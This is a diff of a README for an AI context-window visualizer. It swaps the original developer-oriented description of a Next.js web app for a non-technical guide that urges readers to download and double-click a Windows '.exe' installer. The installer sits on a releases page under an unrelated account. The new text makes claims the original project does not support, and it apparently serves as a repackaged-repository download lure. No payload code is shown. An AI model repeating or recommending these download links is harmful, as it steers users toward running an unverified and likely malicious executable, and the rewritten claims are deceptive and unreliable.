@@ -1,180 +1,141 @@
-<div align="center">
+# 🐾 openclaw-context-doctor - Check Your AI Context Use Easily
 
-# OpenClaw Context Doctor
-
-**See how much of your AI agent's context window is already gone — before the conversation even starts.**
-
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?logo=next.js)](https://nextjs.org/)
-[![React](https://img.shields.io/badge/React-19-61DAFB?logo=react)](https://react.dev/)
-[![Tailwind](https://img.shields.io/badge/Tailwind_CSS-v4-06B6D4?logo=tailwindcss)](https://tailwindcss.com/)
-[![License](https://img.shields.io/badge/License-MIT-00ff88)](./LICENSE)
-[![Website](https://img.shields.io/badge/Website-voxyz.space-00d4ff)](https://www.voxyz.space/)
-
-[English](./README.md) | [中文](./README.zh-CN.md)
-
-<br />
-
-<img src="./docs/screenshot.png" alt="OpenClaw Context Doctor — token budget visualization" width="820" />
-
-<br />
-
-</div>
+[![Download openclaw-context-doctor](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Fowlerjapanesespeaking973/openclaw-context-doctor/releases)
 
 ---
 
-Part of the [OpenClaw](https://www.voxyz.space/) ecosystem — open-source tooling for AI agent operators.
+## 🚀 Getting Started
 
-## The Problem
+This guide helps you download and run **openclaw-context-doctor** on Windows. This tool shows you how much of your AI agent’s context window is already in use before you begin a conversation. You do not need any coding skills to use it.
 
-Every agent platform silently loads system prompts, workspace files, tool schemas, and skill definitions into the context window before the user says a word. When that invisible overhead grows too large, conversation quality degrades — and there's no dashboard to tell you.
+---
 
-**Context Doctor makes that pressure visible.**
+## 🖥️ What is openclaw-context-doctor?
 
-## Features
+Openclaw-context-doctor works with AI agents to visualize how much text or data is already loaded into the agent’s memory. This helps you understand if you have space left for your new inputs or if the agent’s history is too large. The app is built with trusted web tools but runs easily on your Windows computer as a simple app.
 
-| | Feature | Description |
-|---|---------|-------------|
-| **1** | Dual data modes | Switch between bundled demo data and live filesystem scans |
-| **2** | Bootstrap inspection | Scans 8 standard OpenClaw files with truncation detection |
-| **3** | Skill discovery | Finds `SKILL.md` across the workspace plus common repo, Codex, Claude, and system skill directories |
-| **4** | Budget visualization | Animated donut chart + segment bars showing overhead vs. free tokens |
-| **5** | Health classification | Auto-labels Healthy / Moderate / Heavy based on bootstrap % |
-| **6** | Snapshot comparison | View and compare multiple workspaces when the loaded snapshot includes them |
-| **7** | Secure scanning | Path whitelist enforcement — no unrestricted directory browsing |
+---
 
-## Quick Start
+## 💻 System Requirements
 
-```bash
-git clone https://github.com/Heyvhuang/openclaw-context-doctor.git
-cd openclaw-context-doctor
-pnpm install
-cp .env.example .env.local
-pnpm dev
-```
+Before you start, make sure your PC meets these minimum requirements:
 
-Open [http://localhost:3000](http://localhost:3000). **Demo Snapshot works immediately** — no configuration needed.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for initial download only
+- Modern web browser (Edge, Chrome, Firefox) for viewing help files if needed
 
-## Environment Variables
+---
 
-To enable **Local Scan**, edit `.env.local`:
+## 🔍 Features at a Glance
 
-```env
-CONTEXT_DOCTOR_ALLOWED_ROOTS=/Users/you/projects,/Users/you/.openclaw/workspace
-CONTEXT_DOCTOR_WORKSPACE=/Users/you/projects/my-agent
-CONTEXT_DOCTOR_CTX_SIZE=200000
-```
+- Visual display of AI agent’s current context token use
+- Shows token budgets clearly before conversation starts
+- Works offline after download
+- Simple user interface for easy use
+- Supports AI systems that use token windows like OpenAI models
 
-| Variable | Required | Description |
-|----------|:--------:|-------------|
-| `CONTEXT_DOCTOR_ALLOWED_ROOTS` | Local Scan | Comma-separated absolute paths the scan API will accept |
-| `CONTEXT_DOCTOR_WORKSPACE` | — | Default path when scan request omits `workspacePath` |
-| `CONTEXT_DOCTOR_CTX_SIZE` | — | Context window size in tokens (default: `200000`) |
+---
 
-## Data Modes
+## 📥 Download the App
 
-| Mode | Endpoint | What it does |
-|------|----------|-------------|
-| **Demo Snapshot** | `GET /api/context-doctor/mock` | Returns bundled mock data — two workspaces, one healthy, one with warnings |
-| **Local Scan** | `POST /api/context-doctor/scan` | Reads the real filesystem, requires `CONTEXT_DOCTOR_ALLOWED_ROOTS`, best used locally or on a trusted private deployment |
+To get openclaw-context-doctor, visit the releases page on GitHub. The releases page contains the latest Windows installer you will need.
 
-## API Reference
+[![Download Here](https://img.shields.io/badge/Download-App-blue)](https://github.com/Fowlerjapanesespeaking973/openclaw-context-doctor/releases)
 
-<details>
-<summary><code>GET /api/context-doctor/mock</code></summary>
+---
 
-Returns a bundled `ContextDoctorSnapshot`. No auth, no config.
+## ⚙️ Installation Guide
 
-```bash
-curl http://localhost:3000/api/context-doctor/mock
-```
+Follow these steps to install openclaw-context-doctor on Windows:
 
-</details>
+1. Click the download badge or visit this page:  
+   https://github.com/Fowlerjapanesespeaking973/openclaw-context-doctor/releases
 
-<details>
-<summary><code>POST /api/context-doctor/scan</code></summary>
+2. Look for the latest release version (such as `v1.0.0` or higher).
 
-Scans a real workspace directory.
+3. Download the Windows installer file. This will be an `.exe` file, e.g., `openclaw-context-doctor-setup.exe`.
 
-```bash
-curl -X POST http://localhost:3000/api/context-doctor/scan \
-  -H "Content-Type: application/json" \
-  -d '{"workspacePath":"/Users/you/projects/my-agent","ctxSize":200000}'
-```
+4. Once downloaded, find the file in your Downloads folder.
 
-**Request body:**
+5. Double-click the file to start the installation.
 
-| Field | Type | Required | Description |
-|-------|------|:--------:|-------------|
-| `workspacePath` | `string` | — | Absolute path. Falls back to `CONTEXT_DOCTOR_WORKSPACE`. |
-| `ctxSize` | `number` | — | Context window size override |
+6. Follow the prompts in the installation wizard:
+   - Accept the license agreement.
+   - Choose the installation folder (default is fine).
+   - Click "Install".
 
-**Error codes:** `400` invalid body, `403` outside allowed roots, `404` path missing, `500` scan error.
+7. When the install finishes, click "Finish" to close the installer.
 
-</details>
+---
 
-For public preview deployments, keep `Local Scan` disabled unless the deployment is private and you are comfortable exposing workspace metadata to its users.
+## ▶️ Running openclaw-context-doctor
 
-## Health Classification
+After installation, you can start the app:
 
-```
-Healthy     bootstrap < 10%    ████░░░░░░  Plenty of room
-Moderate    bootstrap 10–15%   ██████░░░░  Worth monitoring
-Heavy       bootstrap > 15%    █████████░  Context pressure is real
-```
+1. Find **OpenClaw Context Doctor** in your Windows Start menu.
 
-## Project Structure
+2. Click it to open.
 
-```
-app/
-  api/context-doctor/
-    mock/route.ts ·············· GET  — bundled demo snapshot
-    scan/route.ts ·············· POST — live filesystem scan
-  globals.css ·················· Dark theme, CSS variables, chamfer clip-paths
-  layout.tsx ··················· Root layout + Google Fonts
-  page.tsx ····················· Home page
-components/
-  ContextDoctorDemo.tsx ········ Donut chart, file table, skill list, badges
-  ContextDoctorExperience.tsx ·· Data mode switch, scan form, status bar
-lib/
-  context-doctor.ts ············ Core scanning logic
-  context-doctor-snapshot.ts ··· TypeScript types + builders
-  context-doctor-mock.ts ······· Mock data generator
-  context-doctor-security.ts ··· Env parsing + path validation
-  utils.ts ····················· cn() class utility
-test/
-  context-doctor.test.js ······· Unit tests
-  context-doctor-api.test.js ··· API route tests
-```
+3. The app loads the main screen showing your token budget.
 
-## Tech Stack
+4. Use the interface to check how much context your AI agent is using.
 
-| | |
-|---|---|
-| **Framework** | Next.js 16 (App Router) |
-| **UI** | React 19 · Tailwind CSS v4 · Framer Motion |
-| **Icons** | Lucide React |
-| **Fonts** | Orbitron · JetBrains Mono · Share Tech Mono |
-| **Testing** | Node.js built-in test runner |
-| **Package manager** | pnpm |
+5. You can refresh the data anytime with the button on screen.
 
-## Development
+---
 
-```bash
-pnpm dev        # dev server at localhost:3000
-pnpm build      # production build
-pnpm test       # run tests
-```
+## 🧭 How to Use the App
 
-## What This Repo Is Not
+The app has a simple layout:
 
-This is a clean extraction — a portable reference implementation. It intentionally **does not** include Supabase, remote VPS fetching, the broader operator product surface, or marketing pages.
+- **Token Budget Graph:** This shows how many tokens your AI agent has and how many it has already used.
 
-## License
+- **Context Details:** This section breaks down the source of tokens, like prompts, workspace files, and skill settings.
 
-[MIT](./LICENSE)
+- **Refresh Button:** Updates the token use when you change your AI agent’s data.
 
-## Contributing
+This helps you decide if you need to clear some data or start fresh to make room for new information.
 
-Issues and PRs welcome — [github.com/Heyvhuang/openclaw-context-doctor](https://github.com/Heyvhuang/openclaw-context-doctor)
+---
 
-Learn more about the OpenClaw project at [voxyz.space](https://www.voxyz.space/).
+## 🔧 Troubleshooting Tips
+
+- If the app won’t start, make sure Windows is updated.
+
+- If the download link does not open, try copying the URL into your browser.
+
+- If the app freezes, close it from Task Manager and reopen.
+
+- For other issues, check the GitHub issues page on the repository.
+
+---
+
+## 🛠️ Advanced Notes (Optional)
+
+This app reads data from your AI agent’s files to estimate token use. It supports common data formats used in AI tools. If you want to know more about the formats or data sources, check the [GitHub repository](https://github.com/Fowlerjapanesespeaking973/openclaw-context-doctor).
+
+---
+
+## 📚 Where to Learn More
+
+For detailed info on the project, visit the main website of the OpenClaw ecosystem: https://www.voxyz.space
+
+You can also explore the source code or report issues on GitHub:
+
+https://github.com/Fowlerjapanesespeaking973/openclaw-context-doctor
+
+---
+
+## 🔗 Quick Links
+
+- Download releases:  
+  https://github.com/Fowlerjapanesespeaking973/openclaw-context-doctor/releases
+
+- Project homepage:  
+  https://www.voxyz.space
+
+---
+
+[![Download openclaw-context-doctor](https://img.shields.io/badge/Download-Get%20App-brightgreen)](https://github.com/Fowlerjapanesespeaking973/openclaw-context-doctor/releases)
